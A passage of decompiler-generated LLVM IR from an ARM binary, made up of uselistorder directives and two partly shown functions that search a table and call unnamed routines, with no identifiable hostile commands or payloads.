  uselistorder i1 %v7_9190, { 1, 0 }
  uselistorder i32 %v5_918c, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9174.v4_915c, { 1, 0, 2 }
  uselistorder i1 %v7_913c, { 1, 0 }
  uselistorder i1 %v7_9110, { 1, 0 }
  uselistorder i1 %v7_90e8, { 1, 0 }
  uselistorder i32 %v0_90a4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9074, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_900c, { 1, 0 }
  uselistorder i32 %v2_9000, { 1, 0 }
  uselistorder i32 %v1_9000, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8ff4, { 1, 0 }
  uselistorder i32 %v3_8fd8, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8fb8, { 1, 0 }
  uselistorder i32 %v2_8fac, { 1, 0 }
  uselistorder i32 %v1_8fac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8fa0, { 1, 0 }
  uselistorder i32 %v3_8f84, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8f40, { 1, 0 }
  uselistorder i32 %v5_8f1c, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8f04, { 1, 0 }
  uselistorder i32 %v3_8ee8, { 1, 0 }
  uselistorder i32 %v0_8ea4, { 1, 0 }
  uselistorder i32 %v3_8e70, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e70, { 1, 0 }
  uselistorder i32 %v0_8e70, { 1, 0 }
  uselistorder i32 %v3_8e58, { 1, 0, 2 }
  uselistorder i32 %v0_8e4c, { 1, 2, 0 }
  uselistorder i32 %storemerge46, { 1, 0 }
  uselistorder i1 %v7_8dc8, { 1, 0 }
  uselistorder i32 %v4_8dbc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d8c, { 1, 0 }
  uselistorder i32 %v2_8d80, { 1, 0 }
  uselistorder i32 %v2_8d74, { 1, 0 }
  uselistorder i32 %v1_8d74, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8d68, { 1, 0 }
  uselistorder i32 %v3_8d4c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8cc8, { 0, 2, 1 }
  uselistorder i32 %v2_8ca0, { 1, 0 }
  uselistorder i32 %v1_8ca0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8ca0, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8c8c, { 1, 0 }
  uselistorder i32 %v3_8c6c, { 1, 0, 2 }
  uselistorder i32 %v1_8bd0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8a74, { 1, 0 }
  uselistorder i32 %v3_8854, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8800, { 2, 1, 0, 3 }
  uselistorder i32 %v3_87fc, { 1, 0 }
  uselistorder i32 %v3_87f0, { 2, 0, 1 }
  uselistorder i1 %v7_87dc, { 1, 0 }
  uselistorder i32 %v3_87d4, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87ac, { 1, 0 }
  uselistorder i1 %v7_87a4, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8768, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8768, { 0, 2, 1 }
  uselistorder i32 %v2_8764, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8750, { 1, 0, 2 }
  uselistorder i32 %v1_8710, { 1, 0 }
  uselistorder i32 %v2_86f0, { 1, 0 }
  uselistorder i32 %v1_86f0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_86e4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_86f0, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_86d4, { 1, 0 }
  uselistorder i32 %v3_86c8, { 1, 0, 2 }
  uselistorder i1 %v7_8624, { 1, 0 }
  uselistorder i32 %v3_8620, { 1, 3, 2, 0, 4, 5 }
  uselistorder i1 %v7_85fc, { 1, 0 }
  uselistorder i32 %v4_85d4, { 2, 1, 0 }
  uselistorder i8 %v3_85d4, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_85d4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8878, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_859c, { 1, 0 }
  uselistorder i32 %v1_859c, { 1, 0 }
  uselistorder i1 %v7_8594, { 1, 0 }
  uselistorder i1 %v7_858c, { 1, 0 }
  uselistorder i1 %v7_8584, { 1, 0 }
  uselistorder i32 %v1_8584, { 1, 0 }
  uselistorder i1 %v7_857c, { 1, 0 }
  uselistorder i1 %v7_8574, { 1, 0 }
  uselistorder i32 %v1_8558, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_84f8, { 2, 1, 0, 3, 5, 4, 6 }
  uselistorder i8* %v1_88b8, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_86d8, { 0, 15, 1, 2, 16, 3, 17, 4, 18, 5, 19, 6, 20, 7, 21, 8, 22, 23, 9, 24, 10, 13, 11, 14, 12, 25 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %v2_84b0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_84a4, { 1, 0, 2 }
  uselistorder i32 %v0_8498, { 1, 0 }
  uselistorder i32 %v0_8484, { 1, 0, 2 }
  uselistorder i32 %v2_83f4, { 1, 0 }
  uselistorder i32 %v5_83f0, { 1, 0 }
  uselistorder i32 %v2_83b0, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_839c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8390, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32* %v11_82f4, { 1, 0, 2 }
  uselistorder i32 %v10_82f0, { 23, 22, 21, 13, 12, 19, 18, 17, 20, 16, 15, 30, 29, 28, 31, 27, 26, 14, 25, 24, 11, 10, 9, 34, 33, 32, 40, 39, 38, 36, 37, 35, 45, 44, 43, 42, 41, 8, 7, 6, 5, 4, 3, 2, 1, 0, 46, 47 }
  uselistorder i32 %v2_82e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82c8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_82a0, { 1, 0, 2 }
  uselistorder i8* %v3_829c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9, 10, 11, 12 }
  uselistorder i32 %v3_828c, { 1, 0, 2 }
  uselistorder i32 %v2_8278, { 0, 29, 37, 36, 39, 38, 1, 32, 2, 33, 3, 34, 35, 40, 4, 28, 5, 6, 30, 31, 41, 7, 26, 8, 27, 9, 42, 10, 11, 24, 25, 43, 12, 21, 13, 22, 23, 44, 14, 15, 19, 20, 45, 46, 47, 16, 48, 50, 49, 52, 51, 54, 53, 56, 55, 18, 17, 57 }
  uselistorder i32 %v6_81f8, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 43, 41, 42 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 11, 10, 12, 3, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 74, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 159, 160, 161, 162, 163, 164, 165, 166, 139, 140, 141, 142, 143, 144, 145, 146, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 85, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 109, 106, 107, 108, 110, 111, 112, 116, 117, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 128, 126, 127, 130, 129, 2, 132, 133, 131, 1, 134, 135, 136, 137, 138, 156, 157, 158, 147, 148, 149, 150, 151, 152, 153, 154, 155, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 91, 92, 93, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 73, 76, 77, 79, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 1, 89, 90, 103, 104, 105, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 64, 26, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 62, 60, 61, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 165, 163, 164, 166, 167, 168, 169, 170, 171, 172, 173, 174, 147, 148, 149, 150, 151, 152, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 126, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 1, 141, 142, 143, 144, 145, 146, 161, 162, 153, 154, 155, 156, 157, 158, 160, 159, 0 }
  uselistorder i32* %r0.global-to-local, { 20, 19, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 42, 32, 31, 33, 34, 43, 105, 35, 78, 53, 44, 46, 45, 47, 49, 48, 51, 50, 54, 52, 55, 57, 56, 58, 60, 59, 62, 61, 66, 63, 64, 65, 68, 67, 69, 70, 72, 71, 73, 74, 75, 77, 76, 80, 79, 81, 83, 82, 84, 87, 85, 86, 89, 88, 92, 90, 91, 94, 93, 96, 95, 98, 97, 99, 100, 101, 103, 102, 104, 107, 106, 109, 108, 110, 111, 112, 184, 114, 113, 116, 115, 117, 119, 118, 120, 121, 122, 124, 123, 126, 125, 127, 129, 128, 130, 131, 132, 134, 133, 136, 135, 137, 140, 138, 139, 142, 141, 144, 143, 145, 147, 146, 148, 149, 150, 151, 152, 153, 154, 156, 155, 36, 157, 159, 158, 161, 160, 163, 162, 166, 164, 165, 168, 167, 169, 171, 170, 172, 175, 173, 174, 177, 176, 179, 178, 180, 182, 181, 183, 319, 318, 320, 321, 322, 324, 323, 326, 325, 327, 329, 328, 330, 332, 331, 333, 334, 335, 14, 336, 338, 337, 339, 341, 340, 342, 344, 343, 345, 15, 346, 347, 283, 285, 284, 17, 16, 286, 287, 40, 288, 9, 185, 186, 187, 189, 188, 190, 192, 191, 194, 193, 195, 197, 196, 199, 198, 200, 202, 201, 203, 204, 205, 7, 206, 8, 207, 6, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 264, 263, 265, 266, 5, 267, 3, 268, 4, 270, 269, 2, 272, 271, 275, 273, 274, 13, 1, 276, 277, 12, 278, 11, 10, 279, 280, 41, 281, 282, 18, 39, 315, 38, 316, 317, 37, 289, 291, 290, 292, 293, 294, 296, 295, 297, 298, 300, 299, 302, 301, 304, 303, 306, 305, 308, 307, 309, 310, 311, 312, 313, 314, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 59, 51, 52, 53, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0, 50, 58, 54, 55, 56, 57 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 129, 130, 131, 132, 133, 68, 69, 70, 71, 72, 73, 81, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 107, 109, 108, 103, 104, 105, 106, 110, 111, 112, 113, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 142, 143, 134, 135, 136, 137, 138, 139, 140, 141 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 57, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 135, 136, 137, 138, 139, 73, 74, 75, 76, 77, 78, 85, 79, 80, 81, 82, 83, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 113, 112, 107, 108, 109, 110, 114, 115, 116, 117, 118, 119, 120, 128, 129, 121, 122, 123, 124, 125, 126, 127, 130, 0, 131, 132, 133, 134, 149, 150, 151, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i32 49, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 50, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_197bc.48 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_197ac.44 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_197a4.42 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19798.40 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_197a0.38 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_19778.26 to i32), { 0, 2, 1, 3 }
  uselistorder i32 10240, { 2, 5, 3, 6, 4, 7, 0, 8, 1, 9 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 2, 3, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 10241, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_19780.19 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_9df8, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9cbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c9c, { 2, 0, 1 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9ac8, { 1, 0 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_9a9c, { 2, 0, 1 }
  uselistorder label %.thread38, { 1, 0 }
  uselistorder label %dec_label_pc_9a00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_991c, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_98d0, { 1, 0 }
  uselistorder label %dec_label_pc_98a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_989c, { 1, 0 }
  uselistorder label %bb194, { 1, 0 }
  uselistorder label %bb192, { 1, 0 }
  uselistorder label %bb189, { 1, 0 }
  uselistorder label %dec_label_pc_95bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
  uselistorder label %dec_label_pc_94d0, { 1, 0 }
  uselistorder label %dec_label_pc_94c8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_94a0, { 1, 0 }
  uselistorder label %dec_label_pc_9464, { 1, 0 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %bb183, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_9378, { 2, 1, 0 }
  uselistorder label %bb179, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %.thread24, { 3, 0, 1, 2 }
  uselistorder label %bb173, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_90ac, { 1, 0 }
  uselistorder label %dec_label_pc_8f64, { 1, 0 }
  uselistorder label %dec_label_pc_8e34, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8e0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d9c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8d40, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8d14, { 1, 0 }
  uselistorder label %dec_label_pc_8ce4, { 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %dec_label_pc_8c4c, { 1, 0 }
  uselistorder label %dec_label_pc_8c34, { 1, 0 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_8b4c, { 1, 0 }
  uselistorder label %dec_label_pc_8884, { 1, 0, 2 }
  uselistorder label %dec_label_pc_87b4, { 8, 9, 10, 11, 12, 13, 1, 2, 7, 15, 0, 14, 3, 6, 4, 5 }
  uselistorder label %dec_label_pc_877c, { 1, 0 }
  uselistorder label %dec_label_pc_8700, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_85bc, { 5, 3, 4, 0, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_8538.dec_label_pc_8538_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8510.dec_label_pc_8510_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_84f4, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_84f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8498, { 1, 0 }
  uselistorder label %dec_label_pc_8440, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b4, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f04(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f04:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f04 = icmp eq i32 %arg1, 0
  br i1 %v2_9f04, label %dec_label_pc_9f4c, label %dec_label_pc_9f14

dec_label_pc_9f14:                                ; preds = %dec_label_pc_9f04
  %v0_9f14 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f14 = add i32 %v0_9f14, 4
  %v2_9f14 = inttoptr i32 %v1_9f14 to i8*
  %v3_9f14 = load i8, i8* %v2_9f14, align 1
  %v4_9f14 = zext i8 %v3_9f14 to i32
  %v9_9f18 = icmp eq i32 %v4_9f14, %arg3
  br i1 %v9_9f18, label %dec_label_pc_9f58, label %dec_label_pc_9f3c.preheader

dec_label_pc_9f3c.preheader:                      ; preds = %dec_label_pc_9f14
  br label %dec_label_pc_9f3c

dec_label_pc_9f2c:                                ; preds = %dec_label_pc_9f3c
  %v1_9f2c = add i32 %v0_9f34.in, 12
  %v2_9f2c = inttoptr i32 %v1_9f2c to i8*
  %v3_9f2c = load i8, i8* %v2_9f2c, align 1
  %v4_9f2c = zext i8 %v3_9f2c to i32
  %v9_9f30 = icmp eq i32 %v4_9f2c, %arg3
  br i1 %v9_9f30, label %dec_label_pc_9f58, label %dec_label_pc_9f3c

dec_label_pc_9f3c:                                ; preds = %dec_label_pc_9f3c.preheader, %dec_label_pc_9f2c
  %v0_9f34.in = phi i32 [ %v0_9f14, %dec_label_pc_9f3c.preheader ], [ %v0_9f34, %dec_label_pc_9f2c ]
  %v0_9f3c = phi i32 [ 0, %dec_label_pc_9f3c.preheader ], [ %v1_9f3c, %dec_label_pc_9f2c ]
  %v0_9f34 = add i32 %v0_9f34.in, 8
  %v1_9f3c = add i32 %v0_9f3c, 1
  %v9_9f40 = icmp eq i32 %v1_9f3c, %arg1
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  br i1 %v9_9f40, label %dec_label_pc_9f4c, label %dec_label_pc_9f2c

dec_label_pc_9f4c:                                ; preds = %dec_label_pc_9f3c, %dec_label_pc_9f04, %dec_label_pc_9f58
  %v0_9f4c = phi i32 [ %arg4, %dec_label_pc_9f04 ], [ %v2_9f58, %dec_label_pc_9f58 ], [ %arg4, %dec_label_pc_9f3c ]
  ret i32 %v0_9f4c

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f2c, %dec_label_pc_9f14
  %v0_9f58 = phi i32 [ %v0_9f14, %dec_label_pc_9f14 ], [ %v0_9f34, %dec_label_pc_9f2c ]
  %v1_9f58 = inttoptr i32 %v0_9f58 to i32*
  %v2_9f58 = load i32, i32* %v1_9f58, align 4
  br label %dec_label_pc_9f4c

; uselistorder directives
  uselistorder i32 %v1_9f3c, { 1, 0 }
  uselistorder i32 %v0_9f34, { 1, 0, 2 }
  uselistorder i32 %v0_9f34.in, { 1, 0 }
  uselistorder i32 %v0_9f14, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f3c, { 1, 0 }
}

define i32 @function_9f60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9f60:
  %stack_var_-32 = alloca i32, align 4
  %v3_9f60 = load i32, i32* @r4, align 4
  store i32 %v3_9f60, i32* %stack_var_-32, align 4
  %v6_9f60 = load i32, i32* @r5, align 4
  %v9_9f60 = load i32, i32* @r6, align 4
  %v12_9f60 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_9f78 = call i32 @function_14c4c()
  %v7_9f7c = icmp eq i32 %v0_9f78, -1
  %tmp23 = icmp slt i32 %v0_9f78, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9f60
  br label %dec_label_pc_9f9c

bb24:                                             ; preds = %dec_label_pc_9f60
  %. = zext i1 %v7_9f7c to i32
  store i32 %., i32* @r5, align 4
  %v2_9f94 = icmp eq i1 %v7_9f7c, false
  br i1 %v2_9f94, label %dec_label_pc_9fa4, label %dec_label_pc_9f9c

dec_label_pc_9f9c:                                ; preds = %.thread2, %bb24
  %v2_9f9c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_9f9c, i32* @r4, align 4
  store i32 %v6_9f60, i32* @r5, align 4
  store i32 %v9_9f60, i32* @r6, align 4
  store i32 %v12_9f60, i32* @r7, align 4
  ret i32 %v0_9f78

dec_label_pc_9fa4:                                ; preds = %bb24
  %v0_9fa4 = call i32 @function_14c4c()
  %v7_9fa8 = icmp eq i32 %v0_9fa4, -1
  store i32 %v0_9fa4, i32* @r4, align 4
  br i1 %v7_9fa8, label %dec_label_pc_9fd8, label %dec_label_pc_9fb4

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9fa4
  %v2_9fb4 = icmp eq i32 %v0_9fa4, 0
  br i1 %v2_9fb4, label %dec_label_pc_9fbc, label %dec_label_pc_9fe0

dec_label_pc_9fbc:                                ; preds = %dec_label_pc_9fb4
  %v0_9fbc = load i32, i32* @r6, align 4
  %v1_9fc0 = call i32 @function_15c0c(i32 %v0_9fbc)
  store i32 %v1_9fc0, i32* @r0, align 4
  %v0_9fc4 = call i32 @function_15b88()
  store i32 %v0_9fc4, i32* @r0, align 4
  %v2_9fcc = call i32 @function_14dd8(i32 %v0_9fc4, i32 9)
  %v0_9fd0 = load i32, i32* @r4, align 4
  %v1_9fd4 = call i32 @function_12ee4(i32 %v0_9fd0)
  br label %dec_label_pc_9fd8

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fa4, %dec_label_pc_9fbc
  %v0_9fd8 = load i32, i32* @r5, align 4
  %v1_9fdc = call i32 @function_12ee4(i32 %v0_9fd8)
  br label %dec_label_pc_9fe0

dec_label_pc_9fe0:                                ; preds = %dec_label_pc_9fb4, %dec_label_pc_9fd8
  %v2_9fe4 = load i8, i8* bitcast (i8** @global_var_22324.53 to i8*), align 4
  %v3_9fe4 = zext i8 %v2_9fe4 to i32
  %v2_9fe8 = icmp eq i8 %v2_9fe4, 0
  br i1 %v2_9fe8, label %dec_label_pc_a02c, label %dec_label_pc_9ff0

dec_label_pc_9ff0:                                ; preds = %dec_label_pc_9fe0
  %v2_9ff4 = load i32, i32* @global_var_22328.55, align 4
  %v1_9ff8 = inttoptr i32 %v2_9ff4 to i32*
  %v2_9ff8 = load i32, i32* %v1_9ff8, align 4
  %v1_9ffc = add i32 %v2_9ff8, 4
  %v2_9ffc = inttoptr i32 %v1_9ffc to i8*
  %v3_9ffc = load i8, i8* %v2_9ffc, align 1
  %v4_9ffc = zext i8 %v3_9ffc to i32
  %v1_a000 = load i32, i32* @r7, align 4
  %v9_a000 = icmp eq i32 %v4_9ffc, %v1_a000
  br i1 %v9_a000, label %dec_label_pc_a034, label %dec_label_pc_a020.preheader

dec_label_pc_a020.preheader:                      ; preds = %dec_label_pc_9ff0
  %v1_a004 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a020

dec_label_pc_a010:                                ; preds = %dec_label_pc_a020
  %v4_a010 = mul i32 %v1_a020, 4
  %v5_a010 = add i32 %v4_a010, %v2_9ff4
  %v6_a010 = inttoptr i32 %v5_a010 to i32*
  %v7_a010 = load i32, i32* %v6_a010, align 4
  %v1_a014 = add i32 %v7_a010, 4
  %v2_a014 = inttoptr i32 %v1_a014 to i8*
  %v3_a014 = load i8, i8* %v2_a014, align 1
  %v4_a014 = zext i8 %v3_a014 to i32
  %v9_a018 = icmp eq i32 %v4_a014, %v1_a000
  br i1 %v9_a018, label %dec_label_pc_a034, label %dec_label_pc_a020

dec_label_pc_a020:                                ; preds = %dec_label_pc_a020.preheader, %dec_label_pc_a010
  %v0_a020 = phi i32 [ %v1_a004, %dec_label_pc_a020.preheader ], [ %v1_a020, %dec_label_pc_a010 ]
  %v1_a020 = add i32 %v0_a020, 1
  %v9_a024 = icmp eq i32 %v1_a020, %v3_9fe4
  br i1 %v9_a024, label %dec_label_pc_a02c, label %dec_label_pc_a010

